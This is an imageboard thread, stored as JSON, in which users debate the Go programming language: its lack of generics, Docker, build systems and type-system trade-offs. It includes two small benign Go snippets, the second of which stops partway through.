{"posts":[{"no":6019,"sub":"All things Go","com":"<a href=\"https:\/\/golang.org\/\" rel=\"nofollow\" target=\"_blank\">https:\/\/golang.org\/<\/a><br\/><a href=\"https:\/\/gobyexample.com\/\" rel=\"nofollow\" target=\"_blank\">https:\/\/gobyexample.com\/<\/a><br\/><br\/><pre><code class=\"hljs go\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">main<\/span><span class=\"hljs-params\">()<\/span><\/span> {<br\/>    words := []<span class=\"hljs-keyword\">string<\/span>{<span class=\"hljs-string\">\"Let's\"<\/span>, <span class=\"hljs-string\">\"love\"<\/span>, <span class=\"hljs-string\">\"Lain\"<\/span>}<br\/>    rand.Seed(time.Now().UnixNano())<br\/>    q := <span class=\"hljs-built_in\">make<\/span>(<span class=\"hljs-keyword\">chan<\/span> <span class=\"hljs-keyword\">string<\/span>)<br\/>    <span class=\"hljs-keyword\">for<\/span> _, w := <span class=\"hljs-keyword\">range<\/span> words {<br\/>        <span class=\"hljs-keyword\">go<\/span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span><span class=\"hljs-params\">(w <span class=\"hljs-keyword\">string<\/span>)<\/span><\/span> {<br\/>            time.Sleep(time.Duration(rand.Int63n(<span class=\"hljs-number\">1e9<\/span>)))<br\/>            q &lt;- w<br\/>        }(w)<br\/>    }<br\/>    <span class=\"hljs-keyword\">for<\/span> i := <span class=\"hljs-number\">0<\/span>; i &lt; <span class=\"hljs-built_in\">len<\/span>(words); i++ {<br\/>        fmt.Println(&lt;-q)<br\/>    }<br\/>} <\/code><\/pre><br\/>Good morning lainons, any of you use Go?<br\/>What are your opinions?<br\/><br\/>I only recently started using it a bit, I mainly come from C and Haskell, really liking the minimal language design, the fact that it compiles and the easy, practical concurrency.<br\/><br\/>However somehow the fact that it is developed at Google makes me uncomfortable, probably pretty irrational, but it is what keeps me from fully enjoying it.","name":"sizeof","time":1515248391,"omitted_posts":0,"omitted_images":0,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605702419,"tn_h":189,"tn_w":299,"h":901,"w":1431,"fsize":162023,"filename":"golang","ext":".jpg","tim":"1515248391357","md5":"Uzd2n\/pZTnQkCK0\/MHE81w==","resto":0},{"no":6021,"resto":6019,"com":"I keep trying to use Go but its lack of a good type system prevents the language from being used for larger types. For example, despite Go being praised for its easy-to-use concurrency, here's no sync.Map because that requires generics. Without a larger type system big projects become messier, so Go is rarely used for more than simple programs and glue code.<br\/><br\/>TL;DR lol no generics","name":"Bobby Newmark","time":1515252866,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515252866},{"no":6069,"resto":6019,"com":"<a onclick=\"highlightReply('6021', event);\" href=\"\/\u03bb\/res\/6019.html#6021\">&gt;&gt;6021<\/a><br\/><span class=\"quote\">&gt;no generics<\/span><br\/>stale meme, try again last year","name":"Shogun","time":1515627640,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515627640},{"no":6078,"resto":6019,"com":"<a onclick=\"highlightReply('6069', event);\" href=\"\/\u03bb\/res\/6019.html#6069\">&gt;&gt;6069<\/a><br\/>Does that mean Go has generics now?","name":"J.C. Denton","time":1515664456,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515664456},{"no":6080,"resto":6019,"com":"Go doesn't really have enough of a type system to be fun to work with in my freetime.<br\/>I have done some small-ish CRUD and web apps with it and it seems well suited to those.<br\/><br\/>I can't really give an opinion on whether it's suitable for large projects, as I haven't used it for any.<br\/><br\/>I still don't really see any sort of niche that it would be better suited for than other languages, though.","name":"let","time":1515665247,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515665247},{"no":6085,"resto":6019,"com":"<a onclick=\"highlightReply('6080', event);\" href=\"\/\u03bb\/res\/6019.html#6080\">&gt;&gt;6080<\/a><br\/><br\/>They made Docker with Go, when I realized it I began to see this language as a serious one.","name":"Cowboy","time":1515666529,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515666529},{"no":6086,"resto":6019,"com":"<a onclick=\"highlightReply('6085', event);\" href=\"\/\u03bb\/res\/6019.html#6085\">&gt;&gt;6085<\/a><br\/>I haven't been able to use docker at all on my computer myself. I keep hitting known bugs.","name":"Colmerauer","time":1515666964,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515666964},{"no":6088,"resto":6019,"com":"I dont see why we need new build systems at all makefiles have been working fine for decades","name":"Switch","time":1515671976,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515671976},{"no":6089,"resto":6019,"com":"<a onclick=\"highlightReply('6085', event);\" href=\"\/\u03bb\/res\/6019.html#6085\">&gt;&gt;6085<\/a><br\/>You can make docker with python. Even bash. It's not a good measure for a serious language","name":"Unknown","time":1515673313,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515673313},{"no":6093,"resto":6019,"com":"<a onclick=\"highlightReply('6089', event);\" href=\"\/\u03bb\/res\/6019.html#6089\">&gt;&gt;6089<\/a><br\/><br\/>I disagree. Docker is a pretty solid software, the language has some merit.","name":"x&lt;-&gt;y","time":1515678315,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515678315},{"no":6100,"resto":6019,"com":"<a onclick=\"highlightReply('6088', event);\" href=\"\/\u03bb\/res\/6019.html#6088\">&gt;&gt;6088<\/a><br\/>No, make is a terrible pile of hacks. Writing anything but the dumbest, most straighforward Makefile is not trivial at all, and making it scale is a fruitless endeavor.<br\/>The fact that even soykaftier hacks like autotools have proliferated so much is Make's fault for being such a soykafty tool. C desperately needs a better build system, and Make is not nearly enough.","email":"sage","name":"Masami Eiri","time":1515690277,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515690277},{"no":6103,"resto":6019,"com":"<a onclick=\"highlightReply('6088', event);\" href=\"\/\u03bb\/res\/6019.html#6088\">&gt;&gt;6088<\/a><br\/><span class=\"quote\">&gt;I dont see why we need new build systems at all makefiles have been working fine for decades<\/span><br\/>Makefiles worked fine in the past when software was simple and people actually knew how to code. <br\/><br\/>Unfortunately, many modern companies are in a position where they can't build or deploy an application without pulling in 5GB of dependencies and having a unique configured environment exactly like their snowflake 10x brogrammer's machine. That's the problem that Docker solves.<br\/><br\/><a onclick=\"highlightReply('6093', event);\" href=\"\/\u03bb\/res\/6019.html#6093\">&gt;&gt;6093<\/a><br\/>I think the point of the post you are responding to is that there is nothing about Docker that relies on some unique feature of Go or is amazingly better because it was written in Go. It really could have been written just as well in Python of Bash.","name":"Anonymous","time":1515701616,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515701616},{"no":6105,"resto":6019,"com":"I am starting to use Go as some kind of \"Python for C programmers\" which feels pretty good so far.<br\/><br\/><a onclick=\"highlightReply('6080', event);\" href=\"\/\u03bb\/res\/6019.html#6080\">&gt;&gt;6080<\/a><br\/>Docker and Syncthing, also Caddy (which I am not the biggest fan of, but for different reasons) at least are written in Go, also Hugo, which is my favourite static site generator so far: single binary, easy to use, deploy, and contribute, which in general seems like a philosophy the golang community follows. Compare to similar software written in Ruby\/Python, I always have to clutter my current system, and all future systems with all their dependencies.<br\/>Why would it not be suited for larger projects? It seems to fill a niche that would not be very populated otherwise.<br\/>It's quicker to write in Go than C, but still a pretty fast and compiled (!) language.<br\/>It seems like it really scratches an itch for me.<br\/><br\/>It might sound like that, but I'm not yet sure whether I completely like Go, but my first impressions, as well as it's philosophy, as mentioned above, really make a good impression.<br\/>I would like to read some critique that is more differentiated than the usual \"generics\" echochamber.","name":"Church","time":1515709203,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515709203},{"no":6131,"resto":6019,"com":"<a onclick=\"highlightReply('6019', event);\" href=\"\/\u03bb\/res\/6019.html#6019\">&gt;&gt;6019<\/a><br\/><br\/>I primarily use Go at my day job. My employer has several APIs used in B2B applications and the dev team chose Go because it gets out of the way of the programmer and has excellent reliability due to its type checking and strict error handling strategy. Combined with code linting I have seen a total of three runtime errors in development, none of which made it to production. My opinion of Go is that it requires more thought and design up-front, but the benefit is that it makes debugging and code readability a breeze. It's like buying something in cash versus taking out a loan...you feel a slight sting when the money leaves your wallet, but when you see everyone around you drowning in debt - you realize you made the better long-term choice.","name":"Bob Arctor","time":1515815794,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515815794,"tn_h":200,"tn_w":10,"h":5975,"w":284,"fsize":154363,"filename":"njw7db0d4w3z","ext":"deleted","tim":"","md5":"fgBpaVUX0lCXNjqaexgiIQ=="},{"no":6133,"resto":6019,"com":"<a onclick=\"highlightReply('6131', event);\" href=\"\/\u03bb\/res\/6019.html#6131\">&gt;&gt;6131<\/a><br\/>I used it for the first time at work too to request json from our configuration management software and get a list of all the VMs and some of their statistics since our infrastructure is soykaf. All this was all rendered onto an ugly html\/css page using the vanilla http\/html library. Later I put it in Beego which is a nifty MVC web framework that made it all a bit easier with templating and routing. Later on I made a search engine for some of the VM statistics and it became pretty useful to my employers -- It's nice seeing them use it in meetings and such. Feels good as a young student desu, especially for my first webapp besides a personal website.<br\/><br\/>But there has not been a single person I've talked to at my state school that has used Go before or at any local corp employees I've informally talked to, but I'm going to be hedging my bets on it in terms of employability when I graduate and hopefully move west.<br\/><br\/>It's a fun language, but I have been having some issues with the lack of generics though, especially with parsing arbitrary json. But it's still the most useful language I've used so far.","name":"Marly Krushkhova","time":1515822948,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515822948},{"no":6136,"resto":6019,"com":"<a onclick=\"highlightReply('6131', event);\" href=\"\/\u03bb\/res\/6019.html#6131\">&gt;&gt;6131<\/a><br\/><span class=\"quote\">&gt;strict error handling strategy<\/span><br\/>you mean like <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs autoit\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \">result, _ = <span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span><span class=\"hljs-params\">()<\/span><\/span> <\/code><\/pre>?","name":"Jean Dupont","time":1515849534,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515849534},{"no":6152,"resto":6019,"com":"Go is disgusting.<br\/><br\/>But I think with some metaprogramming facility (third party, of course, those assholes will never include something like it in the language by default), I can tolerate using this piece of shiet for some project.","name":"Undisclosed","time":1515912670,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515912670},{"no":6159,"resto":6019,"com":"<a onclick=\"highlightReply('6152', event);\" href=\"\/\u03bb\/res\/6019.html#6152\">&gt;&gt;6152<\/a><br\/>Mimimi I don't like this cuz it's not created i the way that i want to be. Are you retared or something? Or you are just frustated teeanger? Tell me real args","name":"Case","time":1515945845,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515945845},{"no":6161,"resto":6019,"com":"<a onclick=\"highlightReply('6159', event);\" href=\"\/\u03bb\/res\/6019.html#6159\">&gt;&gt;6159<\/a><br\/><br\/>Don't be naive, boy, the criticisms are widely known. It's pointless to repeat them here \"yada yada generics exceptions\". <br\/><br\/>People eventually will get sick of it and write transpiled languages like they did for Javascript. Go's runtime is awesome, but the language is unpleasant to work with. People are moving towards code generators for avoiding copy'n pasting in Go, it's just a matter of time for a transpiled language to be born.","name":"Random","time":1515948023,"sticky":0,"locked":0,"cyclical":"0","last_modified":1515948023},{"no":6191,"resto":6019,"com":"<a onclick=\"highlightReply('6161', event);\" href=\"\/\u03bb\/res\/6019.html#6161\">&gt;&gt;6161<\/a><br\/><span class=\"quote\">&gt;  but the language is unpleasant to work with. People are moving towards code generators for avoiding copy'n pasting in Go<\/span><br\/>Which metric are you using for that statement besides you simply not liking the language, who is \"People\"?<br\/>You will have to deal with people disagreeing with you on your personal sentiment in this matter, and that there is nothing wrong with that.<br\/>But I get that there is somehow an increasing hatred for UNIX philosophy.<br\/><br\/>Go has issues, but being unpleasant to work with is certainly not one of them.","name":"J.C. Denton","time":1516046069,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516046069},{"no":6214,"resto":6019,"com":"<a onclick=\"highlightReply('6191', event);\" href=\"\/\u03bb\/res\/6019.html#6191\">&gt;&gt;6191<\/a><br\/><br\/>There's nothing special about Go as a language. The runtime is very good, goroutines are nice, but the language itself is unpleasant.<br\/><br\/>It's just a procedural language with limited OO support and closures. In this way it's very similar to Lua and Javascript. But being statically typed means it's a pain in the ass to write flexible code so you must to rely on the \"interface{}\" shiet or reflection.","name":"Rick Deckard","time":1516090236,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516090236},{"no":6220,"resto":6019,"com":"<a onclick=\"highlightReply('6214', event);\" href=\"\/\u03bb\/res\/6019.html#6214\">&gt;&gt;6214<\/a><br\/><span class=\"quote\">&gt; I don't like how a statically typed language gives me a way to write code that shouldn't be possible in a statically typed language<\/span><br\/>Your problem seems to be with statically typed languages. If they aren't your cup of tea, don't use them. The way it uses the empty interface is nifty to me. But to each their own.","name":"Nguoi La","time":1516118023,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516118023},{"no":6223,"resto":6019,"com":"<a onclick=\"highlightReply('6220', event);\" href=\"\/\u03bb\/res\/6019.html#6220\">&gt;&gt;6220<\/a><br\/>You can do it in a type-safe way in any statically typed language worth its salt, because they have generics.<br\/><br\/>Go doesn't even let you do basic soykaf like writing a container that can contain values of a single arbitrary type.  When iterating through collections returned by an unknown library, you have to check the type of every element at runtime because the type system doesn't protect you.","name":"Technician","time":1516120516,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516120516},{"no":6224,"resto":6019,"name":"Trinity","time":1516120549,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516120549,"tn_h":109,"tn_w":200,"h":398,"w":730,"fsize":51676,"filename":"Golang","ext":".jpg","tim":"1516120549280","md5":"IAHdbZ+EIUZrFnkAe6UjFg=="},{"no":6225,"resto":6019,"com":"<a onclick=\"highlightReply('6224', event);\" href=\"\/\u03bb\/res\/6019.html#6224\">&gt;&gt;6224<\/a><br\/><a onclick=\"highlightReply('6224', event);\" href=\"\/\u03bb\/res\/6019.html#6224\">&gt;&gt;6224<\/a><br\/><br\/>I was going to post the same, kek.","name":"Otto Normalverbraucher","time":1516123054,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516123054},{"no":6267,"resto":6019,"com":"<a href=\"https:\/\/github.com\/golang\/go\/issues\/15292\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/golang\/go\/issues\/15292<\/a><br\/><br\/><a href=\"https:\/\/github.com\/golang\/go\/issues\/19007\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/golang\/go\/issues\/19007<\/a><br\/><br\/>Look all of this damage control, hahahahaha, it's hilarious!","name":"Guthrie","time":1516263382,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516263382},{"no":6268,"resto":6019,"com":"I guess it's a testament to Go that people cry so hard about generics instead of just using another language.","name":"Faye Valentine","time":1516267851,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516267851},{"no":6270,"resto":6019,"com":"<a onclick=\"highlightReply('6268', event);\" href=\"\/\u03bb\/res\/6019.html#6268\">&gt;&gt;6268<\/a><br\/>Aren't the ones crying about generics the people who do not use or have to use the language at all?","name":"Undisclosed","time":1516310399,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516310399},{"no":6273,"resto":6019,"com":"<a onclick=\"highlightReply('6270', event);\" href=\"\/\u03bb\/res\/6019.html#6270\">&gt;&gt;6270<\/a><br\/>I like to think people have better things to do than complain about a language they don't even use but this is the internet.","name":"Unidentified","time":1516316493,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516316493},{"no":6275,"resto":6019,"com":"<a onclick=\"highlightReply('6273', event);\" href=\"\/\u03bb\/res\/6019.html#6273\">&gt;&gt;6273<\/a><br\/>People put quite a lot of energy into that.","name":"Sabo Engle","time":1516333294,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516333294},{"no":6277,"resto":6019,"com":"<a onclick=\"highlightReply('6268', event);\" href=\"\/\u03bb\/res\/6019.html#6268\">&gt;&gt;6268<\/a><br\/>I think the main issue is that Go actually has some really nice design features if you disregard generics (for example, interfaces and structural subtyping). <br\/><br\/>I could definitely see myself using Go if it adopts some form of Generics. But not including them means that a lot of code idioms that I use very frequently would be impossible to express effectively leading to either a ton of boiler plate. The alternative is having to use interface{} and reflection which makes the performance and safety go down to the level of a dynamic scripting language, and if I'm willing to do that I might as well just use an actual scripting language.<br\/><br\/>People don't complain about generics for no reason. They do so because it's a really key feature to have in any statically typed language.","name":"Koos van der Merwe","time":1516349122,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516349122},{"no":6279,"resto":6019,"com":"<a onclick=\"highlightReply('6277', event);\" href=\"\/\u03bb\/res\/6019.html#6277\">&gt;&gt;6277<\/a><br\/><br\/>Go is a procedural language with limited OO support and high-order functions\/closures. It seems like a statically typed Lua.","name":"Cypher","time":1516351474,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516351474},{"no":6284,"resto":6019,"com":"<a onclick=\"highlightReply('6279', event);\" href=\"\/\u03bb\/res\/6019.html#6279\">&gt;&gt;6279<\/a><br\/>Lua has excellent prototype-based OO with tables\/metatables though, which ends up being more powerful than that of many statically typed languages if used properly. <br\/><br\/>I think a better description of Go is that it is halfway between Python and C. It is like a Python with metaclasses or inheritance but with structurally subtyped interfaces to emulate duck typing, in a language with C syntax. It has a limited C-like subset, but for anything nontrivial it is used as a dynamically typed language using interface types.","name":"Linda Lee","time":1516367360,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516367360},{"no":6285,"resto":6019,"com":"<a onclick=\"highlightReply('6284', event);\" href=\"\/\u03bb\/res\/6019.html#6284\">&gt;&gt;6284<\/a><br\/>* without metaclasses or inheritance","name":"William Holtzer","time":1516367385,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516367385},{"no":6287,"resto":6019,"com":"<a onclick=\"highlightReply('6277', event);\" href=\"\/\u03bb\/res\/6019.html#6277\">&gt;&gt;6277<\/a><br\/><br\/>I couldn't agree more. There's no generic on the roadmap for Go 2.0. I think there's no single line of code written in this direction.<br\/><br\/>Phuck this fagget language. When Scala native become production ready, it'll be the ultimate language for the problem domain Go is good for.","name":"Judge Fang","time":1516372762,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516372762},{"no":6298,"resto":6019,"com":"People who want generics are usually trying to do something stupid.","name":"Nell","time":1516413946,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516413946},{"no":6305,"resto":6019,"com":"<a onclick=\"highlightReply('6298', event);\" href=\"\/\u03bb\/res\/6019.html#6298\">&gt;&gt;6298<\/a><br\/>People who want Go are usually doing something stupid. See how easy this is?","email":"sage","name":"drop","time":1516437933,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516437933,"tn_h":200,"tn_w":200,"h":700,"w":700,"fsize":98681,"filename":"fire1","ext":"deleted","tim":"","md5":"7kYC8ku5jShi1ku\/tyt\/tA=="},{"no":6307,"resto":6019,"com":"<a onclick=\"highlightReply('6298', event);\" href=\"\/\u03bb\/res\/6019.html#6298\">&gt;&gt;6298<\/a><br\/>Wanting performance better than that of a dynamically typed scripting language is stupid? <br\/><br\/>In compiled languages, generics and monomorphization is a key ingredient in making non-trivial code fast. Otherwise you're going to have tons of runtime typechecks and pointer indirections behind the scenes. By design, Go is only fast-ish for trivial toy problems which only deal with array accesses and structs. As soon as you do something which requires interface types, it slows down a lot compared to idiomatic code in other compiled languages.","name":"Mario Rossi","time":1516442291,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516442291},{"no":6309,"resto":6019,"com":"<a onclick=\"highlightReply('6307', event);\" href=\"\/\u03bb\/res\/6019.html#6307\">&gt;&gt;6307<\/a><br\/>Generics are more like training wheels, they can help when you have no idea what you're doing but are quite useless in the long run. I can think of very very few pieces of codes that couldn't be strictly improved by forgoing them completely, so no support for generics is a sensible, albeit controversial among beginners, design choice. Remember that generalized code is always worse than specialized, that's software engineering 101.","name":"\u85e4\u539f\u7d14\u4e00","time":1516446284,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516446284},{"no":6310,"resto":6019,"com":"<a onclick=\"highlightReply('6309', event);\" href=\"\/\u03bb\/res\/6019.html#6309\">&gt;&gt;6309<\/a><br\/>You need generics for things like the curiously recurring template idiom. I agree that you definitely don't need generics if you have void pointers","name":"Wintermute","time":1516452662,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516452662},{"no":6312,"resto":6019,"com":"<a onclick=\"highlightReply('6309', event);\" href=\"\/\u03bb\/res\/6019.html#6309\">&gt;&gt;6309<\/a><br\/><a onclick=\"highlightReply('6310', event);\" href=\"\/\u03bb\/res\/6019.html#6310\">&gt;&gt;6310<\/a><br\/><span class=\"quote\">&gt;&gt;  you definitely don't need generics if you have void pointers<\/span><br\/><br\/>Is this some kind of sophisticated trolling or what?","name":"Undisclosed","time":1516457932,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516457932},{"no":6314,"resto":6019,"com":"<a onclick=\"highlightReply('6309', event);\" href=\"\/\u03bb\/res\/6019.html#6309\">&gt;&gt;6309<\/a><br\/><span class=\"quote\"><br\/>&gt;Generics are more like training wheels, they can help when you have no idea what you're doing but are quite useless in the long run. <\/span><br\/><span class=\"quote\"><br\/>&gt;I can think of very very few pieces of codes that couldn't be strictly improved by forgoing them completely, so no support for generics is a sensible, albeit controversial among beginners, design choice<\/span><br\/><span class=\"quote\"><br\/>&gt; Remember that generalized code is always worse than specialized, that's software engineering 101.<\/span>","name":"Undisclosed","time":1516468168,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516468168,"tn_h":150,"tn_w":200,"h":700,"w":935,"fsize":1197716,"filename":"golang","ext":".png","tim":"1516468168261","md5":"IJZ0kLeo2Gyuefn8Fmz3Gg=="},{"no":6318,"resto":6019,"com":"Can I just ask if I got this right.<br\/><br\/>You write code like a sort function which works on a specific data type. Then you realize the same code would work on other data types too. So instead of copy and pasting the function for each data type, most languages have some concept of \"generic\" which lets one function operate on multiple data types. (Like C++ templates).<br\/><br\/>Is that what we are fighting about here?<br\/><br\/>I don't understand why this type of feature is \"training wheels\" or how copy and pasting your code 5 times for 5 different datatypes is an \"improvement\".<br\/><span class=\"quote\"><br\/>&gt;Remember that generalized code is always worse than specialized, that's software engineering 101.<\/span><br\/>What does this mean? What is \"specialized\" code?","name":"Special Agent Bob","time":1516472503,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516472503},{"no":6319,"resto":6019,"com":"<a onclick=\"highlightReply('6309', event);\" href=\"\/\u03bb\/res\/6019.html#6309\">&gt;&gt;6309<\/a><br\/><span class=\"quote\">&gt;I can think of very very few pieces of code that couldn't be strictly improved by forgoing them completely<\/span><br\/>That you can't think of any doesn't mean they aren't bountiful.<br\/><span class=\"quote\">&gt;Remember that generalized code is always worse than specialized, that's software engineering 101.<\/span><br\/>Tell that to everyone who has ever authored a book on design patterns, software engineering, or code quality that recommended writing flexible enough code to deal with changing requirements.","name":"Koos van der Merwe","time":1516474343,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516474343,"tn_h":109,"tn_w":200,"h":392,"w":715,"fsize":87276,"filename":"billy-madison-dumber","ext":".jpg","tim":"1516474343514","md5":"jTn24XRCKD5jMbcaGU4MHw=="},{"no":6320,"resto":6019,"com":"<a onclick=\"highlightReply('6309', event);\" href=\"\/\u03bb\/res\/6019.html#6309\">&gt;&gt;6309<\/a><br\/><span class=\"quote\">&gt;Remember that generalized code is always worse than specialized, that's software engineering 101.<\/span><br\/>Quality specialization does not scale well. That's why we have compilers and libraries instead of rewriting every thing in assembly on a per project basis. More importantly, the main purpose of a computer is automation. If you're using a computer to do things manually, you're missing the point.","email":"sage","name":"Ein","time":1516475690,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516475690},{"no":6321,"resto":6019,"com":"<a onclick=\"highlightReply('6318', event);\" href=\"\/\u03bb\/res\/6019.html#6318\">&gt;&gt;6318<\/a><br\/>Yes, you understand what is being discussed Go does not have a way to write a sorting algorithm or data structure that works with multiple types. To do this in Go, a programmer must either rewrite the algorithm or data structure each time, create a tool that generates data structures and algorithms by parsing a superset of Go, or use casting to circumvent the type system and any static type system checks.","email":"sage","name":"list","time":1516475991,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516475991},{"no":6322,"resto":6019,"com":"<a onclick=\"highlightReply('6321', event);\" href=\"\/\u03bb\/res\/6019.html#6321\">&gt;&gt;6321<\/a><br\/>Actually, a generic sorting algorithm (on slices) would work extremely well in Go, if you require the type in the slice to be of some sort of Comparable interface.<br\/>What doesn't work in Go, is creating a generic data structure, like a queue, that can contain values of any type but forces them to all have the same type.","name":"Nobody special","time":1516478805,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516478805},{"no":6329,"resto":6019,"com":"<a onclick=\"highlightReply('6321', event);\" href=\"\/\u03bb\/res\/6019.html#6321\">&gt;&gt;6321<\/a><br\/><a onclick=\"highlightReply('6318', event);\" href=\"\/\u03bb\/res\/6019.html#6318\">&gt;&gt;6318<\/a><br\/>Go has a code generation tool for the very specific case of just copy pasting with different types.<br\/><br\/>Interfaces cover most situations where performance and type safety aren't critical. Also, closures. It's probably overlooked because most languages with closures are either dynamic or come with generics, but in my code closures alone cover a large part of the use case of generics. Moving operations on different types into higher order functions with simple signatures that just give them a basic context to work in obviates a lot of the practical need for generics.<br\/><span class=\"quote\"><br\/>&gt;I don't understand why this type of feature is \"training wheels\" or how copy and pasting your code 5 times for 5 different datatypes is an \"improvement\".<\/span><br\/><br\/>I've never heard generics called 'training wheels' but the reason it's an improvement is because the go creators don't think anyone's ever really implemented generics well in any language. C++ templates are conceptually incomplete and an obvious train wreck to anyone who's ever used or debugged them, and languages with more bulletproof type systems like Rust or Haskell tend to spiral out of control with the level of abstraction and complexity that comes with them. The go creators didn't want that and admitted they didn't have a better solution, so they just punted it possibly to the next version of the language and threw the baby out with the bathwater.","name":"Iverson","time":1516497968,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516497968},{"no":6330,"resto":6019,"com":"<a onclick=\"highlightReply('6329', event);\" href=\"\/\u03bb\/res\/6019.html#6329\">&gt;&gt;6329<\/a><br\/><span class=\"quote\">&gt;Moving operations on different types into higher order functions with simple signatures that just give them a basic context to work in obviates a lot of the practical need for generics.<\/span><br\/><span class=\"quote\">&gt;languages with more bulletproof type systems like Rust or Haskell tend to spiral out of control with the level of abstraction and complexity that comes with them<\/span><br\/>This is very telling. Any existing already implemented solution is too complicated to understand and its benefits are downplayed. The type system of Haskell is probably the easiest part of it to understand.","email":"sage","name":"Incognito","time":1516506654,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516506654},{"no":6332,"resto":6019,"com":"<a onclick=\"highlightReply('6330', event);\" href=\"\/\u03bb\/res\/6019.html#6330\">&gt;&gt;6330<\/a><br\/>The type system in Haskell is not that difficult but it gives license to further complexity in the types themselves, which in turn is ironically a large part of why it's probably one of the easier parts of the language to pick up, and why the rest of it has a reputation for being unwieldy.<br\/><br\/>The fear in go isn't that users won't understand generics, it's that they'll embrace them and replicate the culture of over-engineering in other languages.","name":"cdr","time":1516510951,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516510951},{"no":6356,"resto":6019,"com":"<a onclick=\"highlightReply('6322', event);\" href=\"\/\u03bb\/res\/6019.html#6322\">&gt;&gt;6322<\/a><br\/>couldn't your data structure have a field that contains the data type you want to hold? like type []interface. then just make sure that when you add something, the type of the 'type' member is the same type as what you're trying to add. If this seems really unclear let me know and i'll throw together an example","name":"Frank Garza","time":1516645196,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516645196},{"no":6357,"resto":6019,"com":"<a onclick=\"highlightReply('6322', event);\" href=\"\/\u03bb\/res\/6019.html#6322\">&gt;&gt;6322<\/a><br\/><a onclick=\"highlightReply('6356', event);\" href=\"\/\u03bb\/res\/6019.html#6356\">&gt;&gt;6356<\/a><br\/>ignore me saying []interface instead of interface{}. I went ahead and made it anyways. Could be made cleaner, i'm still pretty new to this though. <br\/><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package<\/span> main<br\/><br\/><span class=\"hljs-keyword\">import<\/span> (<br\/>\t\t<span class=\"hljs-string\">\"fmt\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"errors\"<\/span><br\/>)<br\/><span class=\"hljs-keyword\">type<\/span> queue <span class=\"hljs-keyword\">struct<\/span> {<br\/>\t\tType <span class=\"hljs-keyword\">string<\/span><br\/>\t\tQ []<span class=\"hljs-keyword\">interface<\/span>{}<br\/>\t\tinit <span class=\"hljs-keyword\">bool<\/span><br\/>}<br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-params\">(q *queue)<\/span> <span class=\"hljs-title\">Add<\/span><span class=\"hljs-params\">(item <span class=\"hljs-keyword\">interface<\/span>{})<\/span> <span class=\"hljs-title\">error<\/span><\/span> {<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> !q.init {<br\/>\t\t\t\tq.Type = fmt.Sprintf(<span class=\"hljs-string\">\"%T\"<\/span>,item)<br\/>\t\t\t\tq.Q = <span class=\"hljs-built_in\">append<\/span>(q.Q, item)<br\/>\t\t\t\tq.init = <span class=\"hljs-literal\">true<\/span><br\/>\t\t\t\t<span class=\"hljs-keyword\">return<\/span> <span class=\"hljs-literal\">nil<\/span><br\/>\t\t} <span class=\"hljs-keyword\">else<\/span> <span class=\"hljs-keyword\">if<\/span> fmt.Sprintf(<span class=\"hljs-string\">\"%T\"<\/span>,item) != q.Type {<br\/>\t\t\t\t<span class=\"hljs-keyword\">return<\/span> errors.New(<span class=\"hljs-string\">\"Wrong type! Queue is of type \"<\/span>+q.Type+<span class=\"hljs-string\">\". Given type: \"<\/span>+fmt.Sprintf(<span class=\"hljs-string\">\"%T\"<\/span>,item))<br\/>\t\t} <br\/>\t\tq.Q = <span class=\"hljs-built_in\">append<\/span>(q.Q, 